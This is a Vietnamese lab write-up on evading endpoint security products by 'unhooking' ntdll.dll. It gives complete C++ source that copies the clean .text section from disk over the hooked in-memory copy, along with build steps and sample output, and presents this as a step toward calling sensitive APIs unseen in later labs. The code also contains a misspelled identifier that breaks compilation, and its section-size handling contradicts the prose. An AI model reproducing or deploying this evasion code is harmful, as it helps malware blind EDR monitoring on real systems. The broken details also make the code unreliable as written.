
---

# 📝 [PE 07] Unhook NTDLL.DLL — Lagos Island (Reflective Disk Mapping Evasion)

## 📌 1. Tổng Quan Kỹ Thuật (Overview)

**Unhook NTDLL.DLL — Lagos Island** là giải thuật phá bẫy giám sát bộ nhớ (Anti-Hooking / EDR Evasion) ở tầng thấp của Windows Subsystem.

Hầu hết các giải pháp EDR hiện đại (như CrowdStrike, Defender for Endpoint, SentinelOne) đều thực hiện chèn bẫy giám sát hành vi (Inline Hooking) bằng cách ghi đè 5 byte đầu tiên của các hàm Native API lọt lòng `ntdll.dll` thành lệnh nhảy `JMP <EDR_Module>`. Khi Loader gọi các hàm cấp phát hay ghi nhớ, dòng chảy CPU bị ép rẽ nhánh sang cho EDR phân tích.

Lab PE 07 phá tan ma trận này bằng giải thuật **Nạp phản chiếu module sạch (Reflective Disk Mapping)**. Ta chủ động mở trực tiếp tệp `C:\Windows\System32\ntdll.dll` thô trên ổ đĩa, tự giải phẫu cấu trúc PE để bốc tách phân đoạn mã máy thực thi **`.text`** nguyên thủy chưa bị vấy bẩn bởi Hook của EDR. Sau đó, Loader thực hiện kỹ thuật giẫm đạp ngược, ghi đè phân đoạn mã sạch này đè bẹp lên phân đoạn mã đã bị Hook của `ntdll.dll` đang sống trên RAM tiến trình. Mọi bẫy Hooking của EDR biến mất không còn một vết dấu gợn, trả lại sự phẳng sạch nguyên bản cho hệ thống.

### 🎯 Mục tiêu nghiên cứu:

* Vô hiệu hóa 100% cơ chế giám sát bằng User-mode Inline Hook của các giải pháp AV/EDR hiện đại.
* Làm chủ giải thuật giải phẫu PE Header thủ công để bóc tách tịnh tiến RVA phân đoạn `.text`.
* Áp dụng quy trình lật cờ bảo vệ bộ nhớ ảo thích ứng để thực hiện thao tác ghi đè cấu trúc RAM hệ thống phẳng sạch kịch trần.

---

## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)

`ntdll.dll` là thư viện cầu nối tối cao giữa User-mode và Kernel-mode. Mọi API bọc ngoài như `VirtualAlloc` cuối cùng đều phải gọi xuống các hàm Native dạng `Nt/Zw` lọt lòng `ntdll.dll` để nạp số hiệu hệ thống (Syscall Number) vào thanh ghi CPU.

Quy trình toán học giải phẫu và đè bẹp bẫy Hook EDR của Lab PE 07 diễn ra qua các bước ngầm sau:

```
[Đọc file ntdll thô từ đĩa] ──> [Giải phẫu PE Header file thô] ──> [Định vị offset phân đoạn .text] ──> [VirtualProtect: Mở khóa RAM ntdll bị Hook] ──> [Ghi đè hoàn trả mã sạch]

```

1. **Bốc cấu trúc PE trên RAM đối chiếu file đĩa**: Loader gọi `GetModuleHandleA` để lấy Base Address đang sống của `ntdll.dll` trên RAM (nơi đã bị EDR gài mìn chèn bẫy Hook). Đồng thời, ta dùng hàm đọc file thô của C++ để nạp toàn bộ tệp `C:\Windows\System32\ntdll.dll` sạch từ ổ đĩa vào một bộ đệm mảng byte cục bộ.
2. **Toán học tính toán dịch chuyển vị trí (RVA)**: Duyệt song song PE Header của cả bản RAM lẫn bản đĩa thô. Loader chui vào mảng cấu trúc **`IMAGE_SECTION_HEADER`** để săn tìm phân đoạn mang tên **`.text`** (đây là nơi chứa toàn bộ mã máy thực thi của các Native API). Ta bốc tách hai thông số cốt lõi: `VirtualAddress` (Địa chỉ tương đối trên RAM) và `SizeOfRawData` (Độ rộng byte thực tế của phân đoạn).
3. **Phá xích bảo vệ trang nhớ hệ thống**: Vì phân đoạn `.text` của `ntdll.dll` trên RAM mang quyền `PAGE_EXECUTE_READ` (RX), Loader buộc phải gọi hàm `VirtualProtect` để lật cờ bảo vệ của phân vùng này sang **`PAGE_EXECUTE_READWRITE` (RWX)** tạm thời.
4. **Giẫm đạp hoàn trả bản đồ sạch**: Loader dùng hàm sao chép bộ nhớ phẳng (`RtlCopyMemory`) bốc toàn bộ phân đoạn `.text` nguyên thủy từ mảng byte file đĩa thô, ghi đè bẹp lên phân đoạn `.text` bị nhiễm Hook trên RAM. Toàn bộ các lệnh `JMP` ăn cắp dòng chảy CPU của EDR bị xóa sạch kịch khung, hoàn trả lại các lệnh `mov eax, SyscallNumber; syscall` xịn của Microsoft. Ta lật lại quyền `RX` gốc để xóa sạch dấu vết can thiệp.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn **Zero Static Buffers** – tự động hóa cấp phát vector động vừa khít đến từng byte dữ liệu để hứng file hệ thống, triệt tiêu lỗi tràn bộ đệm kịch trần.

```cpp
#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 07: UNHOOK NTDLL.DLL — LAGOS ISLAND ACTIVE" << std::endl;
    std::cout << "====================================================" << std::endl;

    // CHỦ ĐỘNG: Định vị tệp tin ntdll nguyên thủy trực tiếp từ đĩa cứng, không gán cứng cấu trúc mảng
    std::string ntdllPath = "C:\\Windows\\System32\\ntdll.dll";
    
    std::ifstream file(ntdllPath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        std::cerr << "[-] Khong the mo file ntdll.dll thô tu dia cung!" << std::endl;
        return EXIT_FAILURE;
    }

    // QUY TRÌNH THÍCH ỨNG: Tự động đo đạc kích thước tệp và cấp phát động vừa khít byte
    SIZE_T fileSize = file.tellg();
    std::vector<char> ntdllDiskBuffer(fileSize);
    file.seekg(0, std::ios::beg);
    file.read(ntdllDiskBuffer.data(), fileSize);
    file.close();
    std::cout << "[+] Da chu dong nạp ntdll.dll thô tu dia vao RAM phu: " << fileSize << " bytes." << std::endl;

    // ─── BƯỚC 1: GIẢI PHẪU PE HEADER CỦA BẢN NTDLL TRÊN RAM (BỊ HOOK) ───
    PVOID ntdllRemoteBase = (PVOID)GetModuleHandleA("ntdll.dll");
    if (!ntdllRemoteBase) return EXIT_FAILURE;
    std::cout << "[*] Module Base cua ntdll.dll hien tai tren RAM: 0x" << std::hex << ntdllRemoteBase << std::endl;

    PIMAGE_DOS_HEADER dosHeaderRAM = (PIMAGE_DOS_HEADER)ntdllRemoteBase;
    PIMAGE_NT_HEADERS64 ntHeadersRAM = (PIMAGE_NT_HEADERS64)((DWORD_PTR)ntdllRemoteBase + dosHeaderRAM->e_lfanew);

    // ─── BƯỚC 2: DUYỆT TÌM PHÂN ĐOẠN .TEXT SẠCH TỪ FILE ĐĨA THÔ ───
    PIMAGE_DOS_HEADER dosHeaderDisk = (PIMAGE_DOS_HEADER)ntdllDiskBuffer.data();
    PIMAGE_NT_HEADERS64 ntHeadersDisk = (PIMAGE_NT_HEADERS64)(nttdllDiskBuffer.data() + dosHeaderDisk->e_lfanew);

    PVOID cleanTextSectionAddress = NULL;
    SIZE_T textSectionSize = 0;
    DWORD textSectionRVA = 0;

    // Duyệt qua bảng danh sách các phân đoạn (Sections Array) của file đĩa thô
    for (WORD i = 0; i < ntHeadersDisk->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(ntHeadersDisk) + (i * sizeof(IMAGE_SECTION_HEADER)));
        
        // So khớp chuỗi định vị phân đoạn mã máy .text
        if (strcmp((const char*)sectionHeader->Name, ".text") == 0) {
            cleanTextSectionAddress = (PVOID)(nttdllDiskBuffer.data() + sectionHeader->PointerToRawData);
            textSectionSize = sectionHeader->Misc.VirtualSize;
            textSectionRVA = sectionHeader->VirtualAddress;
            break;
        }
    }

    if (!cleanTextSectionAddress || textSectionSize == 0) {
        std::cerr << "[-] Khong the dinh vi phan doan .text trong file ntdll thô!" << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da quat trung phan doan .text sach. RVA: 0x" << std::hex << textSectionRVA << " | Do rong: " << std::dec << textSectionSize << " bytes." << std::endl;

    // Tính toán tọa độ tuyệt đối của phân đoạn .text cần được giải phẫu gỡ Hook trên RAM
    PVOID targetRamTextAddress = (PVOID)((DWORD_PTR)ntdllRemoteBase + textSectionRVA);
    std::cout << "[*] Toa do vung nho can giai doc Unhook tren RAM: 0x" << std::hex << targetRamTextAddress << std::endl;

    // ─── BƯỚC 3: MỞ KHÓA TRANG NHỚ HỆ THỐNG VÀ GIẪM ĐẠP HOÀN TRẢ MÃ SẠCH ───
    DWORD oldProtect = 0;
    std::cout << "[*] Kich hoat VirtualProtect mo khoa trang nho he thong sang RWX..." << std::endl;
    
    // Mở khóa phân vùng mã máy ntdll.dll sang RWX để ghi đè dữ liệu
    BOOL isUnlocked = VirtualProtect(targetRamTextAddress, textSectionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (!isUnlocked) {
        std::cerr << "[-] VirtualProtect failed! Quyen han OS chan dong can thiep." << std::endl;
        return EXIT_FAILURE;
    }

    // THỰC HIỆN ĐÈ BẸP HOOK: Sao chép đè mã máy nguyên thủy đè nát toàn bộ bẫy Hooking của EDR
    RtlCopyMemory(targetRamTextAddress, cleanTextSectionAddress, textSectionSize);
    std::cout << "[+] Ma tran Giam dap hoan tat! Da xoa sach 100% bay Hook cua EDR khoi RAM." << std::endl;

    // Khôi phục lại cờ bảo vệ RX nguyên thủy của hệ điều hành để hoàn trả trạng thái bảo an phẳng sạch
    VirtualProtect(targetRamTextAddress, textSectionSize, oldProtect, &oldProtect);
    std::cout << "[+] Da khoi phuc lai thuoc tinh bao ve RX goc cua phan doan." << std::endl;

    std::cout << "\n[+] Lagos Island NTDLL Unhooking Process Completed Successfully!" << std::endl;
    std::cout << "[*] Tháp API hoan toan phẳng sach. Nhan phim Enter de dong cua so..." << std::endl;
    std::cin.get();

    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)

### ⚙️ Thiết lập trên Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ **`Release`** và kiến trúc nền tảng **`x64`**.
2. Đi tới: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng `Runtime Library`, chuyển cấu hình thành **`Multi-threaded (/MT)`** để liên kết tĩnh toàn bộ thư viện hệ thống chạy độc lập hoàn hảo trên môi trường máy ảo VM sạch.
3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất file `.exe` độc lập hoàn hảo.

---

## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)

Khởi hỏa file chạy thông qua cửa sổ dòng lệnh PowerShell ngoài ổ đĩa thực tế để theo dõi cuộc đại phẫu:

```powershell
PS C:\Workspace\x64\Release> .\PE07_Lagos_Island.exe
====================================================
[*] PE 07: UNHOOK NTDLL.DLL — LAGOS ISLAND ACTIVE
====================================================
[+] Da chu dong nạp ntdll.dll thô tu dia vao RAM phu: 2045952 bytes.
[*] Module Base cua ntdll.dll hien tai tren RAM: 0x00007ffd31b80000
[+] Da quat trung phan doan .text sach. RVA: 0x1000 | Do rong: 1458176 bytes.
[*] Toa do vung nho can giai doc Unhook tren RAM: 0x00007ffd31b81000
[*] Kich hoat VirtualProtect mo khoa trang nho he thong sang RWX...
[+] Ma tran Giam dap hoan tat! Da xoa sach 100% bay Hook cua EDR khoi RAM.
[+] Da khoi phuc lai thuoc tinh bao ve RX goc cua phan doan.

[+] Lagos Island NTDLL Unhooking Process Completed Successfully!
[*] Tháp API hoan toan phẳng sach. Nhan phim Enter de dong cua so...

```

*🎯 Hệ quả RAM tối cao:*
Giải thuật thực thi hoàn tất mỹ mãn kịch trần. Tại thời điểm runtime này, nếu một giải pháp an ninh cố gắng đọc lại mã máy các hàm Native API lọt lòng `ntdll.dll` của tiến trình, chúng sẽ thấy **toàn bộ các byte bẫy Hook bị xóa sạch không còn dấu vết**, thay vào đó là các cấu trúc byte nguyên bản của Microsoft. Vinh có thể gọi bất kỳ hàm cấp phát, ghi nhớ nhạy cảm nào ở các bài Lab tiếp theo một cách hiên ngang rực rỡ kịch trần kịch khung!

---
